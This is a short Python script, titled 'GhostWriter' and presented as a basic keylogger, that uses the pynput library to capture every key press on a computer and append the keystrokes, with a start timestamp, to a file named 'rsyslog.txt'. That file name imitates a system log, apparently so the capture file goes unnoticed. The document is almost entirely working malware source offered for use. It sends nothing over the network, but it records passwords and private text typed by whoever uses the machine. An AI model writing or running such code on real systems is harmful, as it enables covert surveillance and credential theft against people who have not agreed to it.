##########################################################################################
"""
 $$$$$$\  $$\   $$\  $$$$$$\   $$$$$$\ $$$$$$$$\ $$\      $$\ $$$$$$$\  $$$$$$\ $$$$$$$$\ $$$$$$$$\ $$$$$$$\  
$$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\\__$$  __|$$ | $\  $$ |$$  __$$\ \_$$  _|\__$$  __|$$  _____|$$  __$$\ 
$$ /  \__|$$ |  $$ |$$ /  $$ |$$ /  \__|  $$ |   $$ |$$$\ $$ |$$ |  $$ |  $$ |     $$ |   $$ |      $$ |  $$ |
$$ |$$$$\ $$$$$$$$ |$$ |  $$ |\$$$$$$\    $$ |   $$ $$ $$\$$ |$$$$$$$  |  $$ |     $$ |   $$$$$\    $$$$$$$  |
$$ |\_$$ |$$  __$$ |$$ |  $$ | \____$$\   $$ |   $$$$  _$$$$ |$$  __$$<   $$ |     $$ |   $$  __|   $$  __$$< 
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$\   $$ |  $$ |   $$$  / \$$$ |$$ |  $$ |  $$ |     $$ |   $$ |      $$ |  $$ |
\$$$$$$  |$$ |  $$ | $$$$$$  |\$$$$$$  |  $$ |   $$  /   \$$ |$$ |  $$ |$$$$$$\    $$ |   $$$$$$$$\ $$ |  $$ |
 \______/ \__|  \__| \______/  \______/   \__|   \__/     \__|\__|  \__|\______|   \__|   \________|\__|  \__|
Basic Keylogger Script Made By KUSHAGRA VERMA
"""

# Required Modules
from pynput.keyboard import Listener
import time
# GhostWriter Starts
def write_to_file(key):
    stroke = str(key)
    stroke = stroke.replace("'", "")
    # Filtering Parameters
    if stroke == 'Key.space':
        stroke = ' '
    if stroke == 'Key.shift':
        stroke = ''
    if stroke == "Key.ctrl_l":
        stroke = ""
    if stroke == "Key.enter":
        stroke = "\n"

    with open("rsyslog.txt", 'a') as f:
        f.write(stroke)
#############################################################################################
# Collecting events until stopped
if __name__ == "__main__":
    current_time = time.strftime("%Y-%m-%d %H:%M:%S %Z") # Collecting Time Information from Machine
    with open("rsyslog.txt", 'a') as f:
        f.write(f"Logging Started: {current_time}\n")

    with Listener(on_press=write_to_file) as log:
        log.join()
#############################################################################################
